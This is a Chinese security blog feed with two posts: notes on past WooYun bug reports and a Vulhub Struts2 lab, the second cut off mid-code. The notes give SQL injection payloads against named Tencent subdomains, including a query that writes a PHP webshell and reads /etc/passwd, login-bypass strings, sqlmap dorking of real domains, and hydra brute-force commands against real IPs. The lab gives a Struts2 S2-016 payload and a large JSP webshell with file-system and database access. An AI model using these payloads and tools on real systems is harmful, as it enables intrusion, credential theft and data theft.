    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前挖洞还是差了点，本来是想混个营长的，死活挖不出最后一个中危。难受是肯定的，可是也暴露了我的一些明显的不足，太依靠运气，应该静下心来好好学习一下了。这个文章长期更新吧，算给自己做做长期的笔记。</p><p>安利一个镜像 <a href="https://shuimugan.com" target="_blank" rel="noopener">https://shuimugan.com</a></p><p>ps:最后还是混到了营长 没想到审了这么久一个洞感谢，Art3mis师傅千里送payload。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="11-07"><a href="#11-07" class="headerlink" title="11-07"></a>11-07</h2><h3 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h3><p>腾讯某分站SQL注射-直接绕过WAF <a href="https://bugs.shuimugan.com/bug/view?bug_no=90369" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=90369</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://fun.kid.qq.com/funshop/testfunshow/ebookController/update_assets_list?campaignID=0&amp;etclass=0&amp;formatID=50&quot;</span><br><span class="line">formatID 存在注射。</span><br><span class="line">利用双重urlencode 直接绕过 waf 拦截。</span><br></pre></td></tr></table></figure><p>腾讯QQ彩票某处SQL注射-可看到中奖记录 <a href="https://bugs.shuimugan.com/bug/view?bug_no=86707" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=86707</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">彩票中奖记录查询处：</span><br><span class="line">http://888.sports.qq.com/tws/centerrecord/GetCenterRecord?mod=award&amp;pagesize=10&amp;page=0&amp;type=jczq&amp;days=30&amp;_=14182187</span><br><span class="line">type 参数存在SQL注入。</span><br><span class="line">POC:</span><br><span class="line">mod=award&amp;pagesize=10&amp;page=0&amp;type=dllc&apos;)||(true) limit 30%23&amp;days=30&amp;_=14182187</span><br></pre></td></tr></table></figure><p>腾讯某分站SQL爆错注入 <a href="https://bugs.shuimugan.com/bug/view?bug_no=70666" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=70666</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POC:</span><br><span class="line">http://ifzq.finance.qq.com/other/tips/modall/mod?_callback=NEWSTOCKPROXY14069079458626&amp;uin=xxxxx&amp;code=sh603111&amp;high=0.00&amp;low=0.00&amp;updown=-1.00-0 and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)&amp;type=2010</span><br></pre></td></tr></table></figure><p>状态码盲注<a href="https://bugs.shuimugan.com/bug/view?bug_no=67581" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=67581</a></p><p>腾讯某分站一个常规注入 <a href="https://bugs.shuimugan.com/bug/view?bug_no=70398" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=70398</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin.comic.qq.com/site/getScore?jsonpCallbackParam=initStarSuccessCallback&amp;eid=278 and UpdateXML(1,CONCAT(0x5b,mid((SELECT database()),1,32),0x5d),1)#&amp;ajax=true&amp;_=1406730256944</span><br></pre></td></tr></table></figure><p>QQ某站点MySQL注射(支持union)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参数f_uid可注入。MySQL union注入。 </span><br><span class="line">f_channel_name=test&amp;f_uid=-1&apos; OR ascii(mid(user()from(1)for(1)))!=123 AND 1=1 --</span><br></pre></td></tr></table></figure><p>从一个phpinfo到一次半途而废的腾讯内网漫游之旅</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://isux.oa.com/sola/server/showPic.php</span><br><span class="line">user=1&apos; union select 1,&quot;&lt;?php system(&apos;ps aux&apos;)?&gt;&quot;,load_file(&apos;/etc/passwd&apos;),4,5,6,7,8,9,0 into outfile &quot;/data/imgcache/htdocs/sola/public/1k23hj1k22b.php&quot; -- ;</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>问了一下带头老哥大师傅，他说他的SQL注入是手注找测试点的，意味着这个细心和耐心是很重要了，自己和玩XSS一样老老实实一个个测吧，看之前大佬们的总结，SQL注入的挖掘重点在于闭合语句。</p><p>盲注的语句找注入点看来是个蛮不错的选择总结几个闭合方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(1,sleep(3),null) --+</span><br><span class="line">or 1=1--+ </span><br><span class="line"></span><br><span class="line">&apos;or 1=1--+ </span><br><span class="line"></span><br><span class="line">&quot;or 1=1--+ </span><br><span class="line"></span><br><span class="line">)or 1=1--+ </span><br><span class="line"></span><br><span class="line">&apos;)or 1=1--+ </span><br><span class="line"></span><br><span class="line">&quot;) or 1=1--+ </span><br><span class="line"></span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><p>绕过登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&apos; or 1=1#</span><br><span class="line">&apos; or 1=1/*</span><br><span class="line">&apos;) or &apos;1&apos;=&apos;1--</span><br><span class="line">&apos;) or (&apos;1&apos;=&apos;1--</span><br></pre></td></tr></table></figure><p>实践规则总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;)||(true) limit 30%23</span><br><span class="line">and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)&amp;type=2010</span><br><span class="line">and UpdateXML(1,CONCAT(0x5b,mid((SELECT database()),1,32),0x5d),1)#</span><br><span class="line">&apos; OR ascii(mid(user()from(1)for(1)))!=123 AND 1=1 --</span><br></pre></td></tr></table></figure><h3 id="SQLMAP小结"><a href="#SQLMAP小结" class="headerlink" title="SQLMAP小结"></a>SQLMAP小结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--batch 从不询问用户输入,使用所有默认配置。</span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">-–count    表中数据条数</span><br><span class="line">–start 1 –stop 20 #列出指定字段，列出20 条</span><br></pre></td></tr></table></figure><p>好用的语句例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基于google爬虫的sql注入 python sqlmap.py -g &quot;site:bilibili.com inurl:.php?&quot; --batch --random-agent</span><br><span class="line">防止进局子的 python sqlmap.py -u &quot;http://xxxxx/sqli-labs-master/Less-2/?id=1&quot; --count -D &quot;mysql&quot;</span><br></pre></td></tr></table></figure><p>python sqlmap.py -g “site:xinlingshou.cn  inurl:.php?” –batch –random-agent</p><p>python sqlmap.py -u “<a href="http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1&quot;" target="_blank" rel="noopener">http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1&quot;</a> –random-agent</p><p><a href="http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1" target="_blank" rel="noopener">http://www.mei.com/home/search.html?q=1&amp;filter=default&amp;pageIndex=1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ASRC TEST</span><br><span class="line">https://bsstest1.yyzws.com/leaf_manager_web/static/html/login.html?    admin 123456</span><br><span class="line">101.37.224.91</span><br></pre></td></tr></table></figure><h3 id="sqlmapapi"><a href="#sqlmapapi" class="headerlink" title="sqlmapapi"></a>sqlmapapi</h3><p>扫描结果在/scan/taskid/data下查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx:8888/scan/49e710973a44ffd2/data</span><br></pre></td></tr></table></figure><h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://shuimugan.com/bug/view?bug_no=170508     js控制二维码跳转地址 以及绕过</span><br><span class="line">poc http://vac.qq.com/common/pc/pc.html?title=乌云来啦&amp;acturl=http://banfei.zhongan.com:@wooyun.org/</span><br></pre></td></tr></table></figure><p>QQ一个强制聊天漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://shuimugan.com/bug/view?bug_no=167168   mqqwpa:// 协议没有加密，可以通过 mqqwpa://im/chat?chat_type=wpa&amp;uin=QQ号码&amp;version=1&amp;src_type=web&amp;web_src=&amp;name=0</span><br></pre></td></tr></table></figure><h3 id="扫描器总结"><a href="#扫描器总结" class="headerlink" title="扫描器总结"></a>扫描器总结</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16</span><br><span class="line">nmap -sP --min-hostgroup 1024 --min-parallelism 1024 -iL ip.txt -oG ip_output1113.txt</span><br></pre></td></tr></table></figure><p>-sn    不扫描端口，只ping主机</p><p>-PE   通过ICMP echo判定主机是否存活</p><p>-n     不反向解析IP地址到域名</p><p>–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描</p><p>–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024</p><p>-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml</p><p>一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 -v 14.116.140.49</span><br><span class="line">参数：</span><br><span class="line">-sS    TCP SYN扫描    nmap -sS 192.168.1.254   </span><br><span class="line">-P     指定端口扫描   nmap -sS -P 1-65535 192.168.1.254</span><br><span class="line">-V     详细信息       nmap -V -sS 192.168.1.254</span><br></pre></td></tr></table></figure><h4 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan --ports 1-65535 14.116.143.118 --rate 1000 --wait 1</span><br></pre></td></tr></table></figure><h4 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-R   根据上一次进度继续破解</span><br><span class="line">-S   使用SSL协议连接</span><br><span class="line">-s   指定端口</span><br><span class="line">-l   指定用户名</span><br><span class="line">-L   指定用户名字典(文件)</span><br><span class="line">-p   指定密码破解</span><br><span class="line">-P   指定密码字典(文件)</span><br><span class="line">-e   空密码探测和指定用户密码探测(ns)</span><br><span class="line">-M   &lt;FILE&gt;指定目标列表文件一行一条</span><br><span class="line">-f   在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-C   用户名可以用:分割(username:password)可以代替-l username -p password</span><br><span class="line">-o   &lt;FILE&gt;输出文件</span><br><span class="line">-t   指定多线程数量，默认为16个线程</span><br><span class="line">-w   TIME 设置最大超时的时间，单位秒，默认是30s</span><br><span class="line">-vV  显示详细过程</span><br><span class="line">server     目标IP</span><br><span class="line">service    指定服务名(telnet ftp pop3 mssql mysql ssh ssh2......)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L uname.txt -P pwd.txt 192.168.1.3 telnet</span><br><span class="line">hydra -l root -P oracle_logins.txt -t 5 -vV -o oracle_passwords.txt -s 30002 -e ns 121.41.173.190 mysql</span><br></pre></td></tr></table></figure><h4 id="patator"><a href="#patator" class="headerlink" title="patator"></a>patator</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=FILE0 user=FILE1 password=FILE2 0=hosts.txt 1=logins.txt 2=passwords.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python patator.py telnet_login host=10.10.12.77 user=FILE=0 0=3389u.txt password=FILE1 1=3389d.txt</span><br></pre></td></tr></table></figure><h4 id="dirs3arch目录爆破"><a href="#dirs3arch目录爆破" class="headerlink" title="dirs3arch目录爆破"></a>dirs3arch目录爆破</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirs3arch.py -u https://gjapplog.uc.cn/ -e php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://g.1905.com:80/index.php?m=Home&amp;c=Newsdetail&amp;a=commentlist&quot; --data=&quot;p=1&amp;id=1395&amp;type=2&quot;</span><br></pre></td></tr></table></figure><h4 id="Wfuzz"><a href="#Wfuzz" class="headerlink" title="Wfuzz"></a>Wfuzz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hc 404 &apos;http://api.bilibili.com/x/v2/FUZZ?type=1&amp;oid=512345&apos;</span><br><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hh 30 &apos;http://api.sc.weibo.com/?FUZZ&apos;</span><br><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hc 404 &apos;http://go.chaohua.weibo.com/?FUZZ&apos;</span><br><span class="line">wfuzz -w /home/ubuntu/lego/dict/parm.txt --hc 404 &apos;http://dataflow.biliapi.com/s/FUZZ&apos;</span><br></pre></td></tr></table></figure><h4 id="java项目打包成jar"><a href="#java项目打包成jar" class="headerlink" title="java项目打包成jar"></a>java项目打包成jar</h4><p><a href="https://www.cnblogs.com/tianyanzhi/p/8067239.html" target="_blank" rel="noopener">https://www.cnblogs.com/tianyanzhi/p/8067239.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="笔记" scheme="https://legoc.github.io/tags/笔记/"/>
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="wooyun" scheme="https://legoc.github.io/tags/wooyun/"/>
    
  </entry>
  
  <entry>
    <title>初试Vulhub</title>
    <link href="https://legoc.github.io/2018/11/01/%E5%88%9D%E8%AF%95Vulhub/"/>
    <id>https://legoc.github.io/2018/11/01/%E5%88%9D%E8%AF%95Vulhub/</id>
    <published>2018-11-01T05:53:07.000Z</published>
    <updated>2019-07-24T13:50:13.246Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub</a> 是github上的一个开源项目。</p><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。 </p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装好docker后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 启动docker服务</span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"># 安装compose</span><br><span class="line">pip install docker-compose </span><br><span class="line"></span><br><span class="line"># 下载项目</span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>每个环境目录下都有相应的说明文件，请阅读该文件，进行漏洞/环境测试。</p><p>测试完成后，删除整个环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure><h3 id="初试Struts2-s2-016"><a href="#初试Struts2-s2-016" class="headerlink" title="初试Struts2 s2-016"></a>初试Struts2 s2-016</h3><p>之前经常看到Struts2系列的漏洞文章，但是一直没有实践过，如今正好来试试，</p><p>具体原理现在还很菜就不多分析了，先感受一把黑阔的feel。</p><p>打开靶场xx.xx.xx.xx:8080/index.action</p><p>后面接上payload就可以爆路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br></pre></td></tr></table></figure><p>爆出路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT/</span><br></pre></td></tr></table></figure><p>用用之前安恒的那个Struts2检测工具</p><p><img src="/2018/11/01/初试Vulhub/1.jpg" alt=""></p><p>jsp一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;</span><br><span class="line">&lt;%!String Pwd = &quot;lego&quot;;</span><br><span class="line"></span><br><span class="line">    String EC(String s, String c) throws Exception &#123;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span><br><span class="line"></span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Class.forName(x[0].trim()).newInstance();</span><br><span class="line">        Connection c = DriverManager.getConnection(x[1].trim());</span><br><span class="line">        if (x.length &gt; 2) &#123;</span><br><span class="line">            c.setCatalog(x[2].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File r[] = File.listRoots();</span><br><span class="line">        for (int i = 0; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(0, 2));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = &quot;&quot;;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        for (int i = 0; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.format(dt);</span><br><span class="line">            sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;</span><br><span class="line">            sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;</span><br><span class="line">            if (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()</span><br><span class="line">                        + &quot;\t&quot; + sQ + &quot;\n&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span 